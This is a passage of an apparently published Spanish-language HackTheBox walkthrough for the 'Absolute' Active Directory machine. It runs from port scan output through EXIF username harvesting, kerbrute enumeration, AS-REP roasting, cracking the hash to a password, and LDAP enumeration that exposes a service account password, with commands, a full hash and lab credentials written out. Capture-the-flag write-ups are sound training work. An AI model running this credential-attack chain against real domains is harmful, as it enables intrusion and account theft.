593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: absolute.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-06-18T07:16:42+00:00<span class="p">;</span> +7h00m00s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
| Not valid before: 2023-07-17T21:11:52
|_Not valid after:  2024-07-16T21:11:52
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-06-18T07:16:36
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un entorno de Directorio Activo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.181
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.181 absolute.htb dc.absolute.htb DC.absolute.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.181 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[!]</span> Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights. on line 970
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/usr/bin/smbmap"</span>, line 33, <span class="k">in</span> &lt;module&gt;
    sys.exit<span class="o">(</span>load_entry_point<span class="o">(</span><span class="s1">'smbmap==1.9.2'</span>, <span class="s1">'console_scripts'</span>, <span class="s1">'smbmap'</span><span class="o">)())</span>
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File <span class="s2">"/usr/lib/python3/dist-packages/smbmap/smbmap.py"</span>, line 1435, <span class="k">in </span>main
    host <span class="o">=</span> <span class="o">[</span> host <span class="k">for </span>host <span class="k">in </span>share_drives_list.keys<span class="o">()</span> <span class="o">][</span>0]
                              ^^^^^^^^^^^^^^^^^^^^^^
AttributeError: <span class="s1">'bool'</span> object has no attribute <span class="s1">'keys'</span>
^CYou pressed Ctrl+C!...
You pressed Ctrl+C!
➜  nmap smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.10.11.181
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.11.181 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.181
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Esta es la página web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/1.png" />
</p>

<ul>
  <li>Estas son las tecnologías que están corriendo en la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.181</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Absolute</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> no encontramos anda interesante mas que la ruta <code class="language-plaintext highlighter-rouge">images</code> que al parecer son varias con el nombre de <code class="language-plaintext highlighter-rouge">hero</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content feroxbuster <span class="nt">-u</span> http://10.10.11.181 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.181
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ <span class="nb">true</span>
 🏁  HTTP methods          │ <span class="o">[</span>GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
301      GET        2l       10w      150c http://10.10.11.181/images <span class="o">=&gt;</span> http://10.10.11.181/images/
200      GET       33l       64w      782c http://10.10.11.181/js/main.js
200      GET        6l       77w     3351c http://10.10.11.181/css/owl.carousel.min.css
200      GET      145l      442w     4030c http://10.10.11.181/css/style.css
200      GET        5l      369w    21003c http://10.10.11.181/js/popper.min.js
200      GET        7l      689w    63240c http://10.10.11.181/js/bootstrap.min.js
200      GET        7l      277w    44342c http://10.10.11.181/js/owl.carousel.min.js
200      GET        2l     1283w    86926c http://10.10.11.181/js/jquery-3.3.1.min.js
301      GET        2l       10w      150c http://10.10.11.181/Images <span class="o">=&gt;</span> http://10.10.11.181/Images/
200      GET     3625l     7946w    77906c http://10.10.11.181/css/animate.css
200      GET     4919l     8218w    79820c http://10.10.11.181/fonts/icomoon/style.css
200      GET        7l     2103w   160392c http://10.10.11.181/css/bootstrap.min.css
403      GET       29l       92w     1233c http://10.10.11.181/fonts/
403      GET       29l       92w     1233c http://10.10.11.181/fonts/icomoon/
403      GET       29l       92w     1233c http://10.10.11.181/js/
403      GET       29l       92w     1233c http://10.10.11.181/css/
301      GET        2l       10w      147c http://10.10.11.181/css <span class="o">=&gt;</span> http://10.10.11.181/css/
200      GET      948l     7256w   690337c http://10.10.11.181/images/hero_3.jpg
200      GET     2425l    11064w   656123c http://10.10.11.181/images/hero_2.jpg
200      GET     1306l     7961w   733740c http://10.10.11.181/images/hero_1.jpg
200      GET        0l        0w  5501527c http://10.10.11.181/images/hero_6.jpg
200      GET        0l        0w  2085276c http://10.10.11.181/images/hero_4.jpg
200      GET        0l        0w  1834774c http://10.10.11.181/images/hero_5.jpg
</code></pre></div></div>

<ul>
  <li>Como tal las imágenes existen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/2.png" />
</p>

<ul>
  <li>Son 6 imágenes en total así que vamos a descargarlas todas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..6<span class="o">}</span><span class="p">;</span> <span class="k">do </span>wget <span class="s2">"http://10.10.11.181/images/hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"Descargada la imagen hero_</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">.jpg"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Si inspeccionamos una foto con <code class="language-plaintext highlighter-rouge">exiftool</code> vemos que en el apartado de <code class="language-plaintext highlighter-rouge">Author</code> encontramos un nombre de usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content exiftool hero_1.jpg
ExifTool Version Number         : 12.76
File Name                       : hero_1.jpg
Directory                       : <span class="nb">.</span>
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 14:45:20-05:00
File Access Date/Time           : 2024:06:18 12:12:39-06:00
File Inode Change Date/Time     : 2024:06:18 12:12:39-06:00
File Permissions                : <span class="nt">-rw-r--r--</span>
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian <span class="o">(</span>Intel, II<span class="o">)</span>
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : <span class="o">[</span>14], Encoded with <span class="nv">Blend</span><span class="o">=</span>1 downsampling
APP14 Flags 1                   : <span class="o">(</span>none<span class="o">)</span>
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
Image Size                      : 1900x1150
Megapixels                      : 2.2
</code></pre></div></div>

<ul>
  <li>Como vemos un nombre de usuario los mas probable es que los demás usuarios también tengan un nombre de usuario en cada foto así que vamos a filtrar por ese campo para ver los nombres.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content exiftool hero_<span class="k">*</span>.jpg <span class="nt">-Author</span>
<span class="o">========</span> hero_1.jpg
Author                          : James Roberts
<span class="o">========</span> hero_2.jpg
Author                          : Michael Chaffrey
<span class="o">========</span> hero_3.jpg
Author                          : Donald Klay
<span class="o">========</span> hero_4.jpg
Author                          : Sarah Osvald
<span class="o">========</span> hero_5.jpg
Author                          : Jeffer Robinson
<span class="o">========</span> hero_6.jpg
Author                          : Nicole Smith
    6 image files <span class="nb">read</span>
</code></pre></div></div>

<ul>
  <li>Vamos hacer una lista con la estructura de los nombres de un Active Directory primero la letra mayúscula y después su nombre.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
J.Roberts
M.Chaffrey
D.Klay
S.Osvald
J.Robinson
N.Smith
</code></pre></div></div>

<ul>
  <li>Teniendo esta lista potencial de usuarios vamos a ver si son validos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> dc.absolute.htb <span class="nt">-d</span> absolute.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/18/24 - Ronnie Flathers @ropnop

2024/06/18 12:56:17 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/06/18 12:56:17 <span class="o">&gt;</span>  	dc.absolute.htb:88

2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 M.Chaffrey@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 S.Osvald@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Roberts@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 N.Smith@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Robinson@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 D.Klay@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  Done! Tested 6 usernames <span class="o">(</span>6 valid<span class="o">)</span> <span class="k">in </span>0.331 seconds
</code></pre></div></div>

<ul>
  <li>Ahora que sabemos que los usuario son validos podemos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers absolute.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] User J.Roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Chaffrey doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB:90b6ffe0ec2f136b9268b7bc5ea29f46<span class="nv">$f2f0909c2a88da7f818720581aaf8143b646f285fb93489bf228d37acfb190c7d777ce0b22a5e61a7e9f6b293037e0f90899db4de678920773547c032cbd26dd22f9008e75a75b8ce4902959778bb52344bd76e61bfb406e575105b4d2e62130261f43b535333dddaa1587116edaac1babeb69b3e85f45797513a2f5852b97995127fced566cd2a65d8358fa894c5dae47938dd083c99c21c28055ff83ffa743e66a899ceb26a6fa1edac18796ddb7f26791309cfb6a812e6e0dbbc76ce8abddb9ed9929aa8c351e3db6932389544a85c0cb06c375de560737b51872ed9810f2131fbd785f979d7eb2d0054b</span>
<span class="o">[</span>-] User S.Osvald doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User J.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User N.Smith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>Tenemos el hash de <code class="language-plaintext highlighter-rouge">D.Klay</code> vamos a crackearlo para ver su contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Darkmoonsky248girl <span class="o">(</span><span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB<span class="o">)</span>
1g 0:00:00:24 DONE <span class="o">(</span>2024-06-18 13:00<span class="o">)</span> 0.04149g/s 466323p/s 466323c/s 466323C/s DarrenCahppell..Danuelle
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"D.Klay:Darkmoonsky248girl"</span> | <span class="nb">sudo tee </span>creds.txt
D.Klay:Darkmoonsky248girl
</code></pre></div></div>

<ul>
  <li>Vamos a sincronizarnos al reloj del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>ntpdate <span class="nt">-s</span> absolute.htb
</code></pre></div></div>

<ul>
  <li>Sin embargo las credenciales nos devuelven un <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code> <a href="https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/">https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
</code></pre></div></div>

<ul>
  <li>Si nos autenticamos con el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code> nos dicen que si son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/3.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
</code></pre></div></div>

<h2 id="svc_smb">svc_smb</h2>

<ul>
  <li>Como por <code class="language-plaintext highlighter-rouge">kerberos</code> las credenciales son correctas podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code> recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.181    445    DC               Share           Permissions     Remark
SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.181    445    DC               Shared
SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Bueno no hay nada interesante algo que podemos hacer es usar el protocolo <code class="language-plaintext highlighter-rouge">ldap</code> para enumerar usuarios del dominio mediante al autenticación de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--users</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.10.11.181    389    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
LDAP        10.10.11.181    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 20
LDAP        10.10.11.181    389    DC               Administrator                  Built-in account <span class="k">for </span>administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest                          Built-in account <span class="k">for </span>guest access to the computer/domain
LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.181    389    DC               J.Roberts
LDAP        10.10.11.181    389    DC               M.Chaffrey
LDAP        10.10.11.181    389    DC               D.Klay
LDAP        10.10.11.181    389    DC               s.osvald
LDAP        10.10.11.181    389    DC               j.robinson
LDAP        10.10.11.181    389    DC               n.smith
LDAP        10.10.11.181    389    DC               m.lovegod
LDAP        10.10.11.181    389    DC               l.moore
LDAP        10.10.11.181    389    DC               c.colt
LDAP        10.10.11.181    389    DC               s.johnson
LDAP        10.10.11.181    389    DC               d.lemm
LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.10.11.181    389    DC               svc_audit
LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
</code></pre></div></div>

<ul>
  <li>Tenemos nuevas credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D.Klay:Darkmoonsky248girl
svc_smb:AbsoluteSMBService123!
</code></pre></div></div>

<ul>
  <li>Si las revisamos vemos que son correctas usando el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
</code></pre></div></div>

<h2 id="mlovegod">m.lovegod</h2>

<ul>
  <li>Podemos volver a listar recursos compartidos por el protocoló <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.181    445    DC               Share           Permissions     Remark
SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
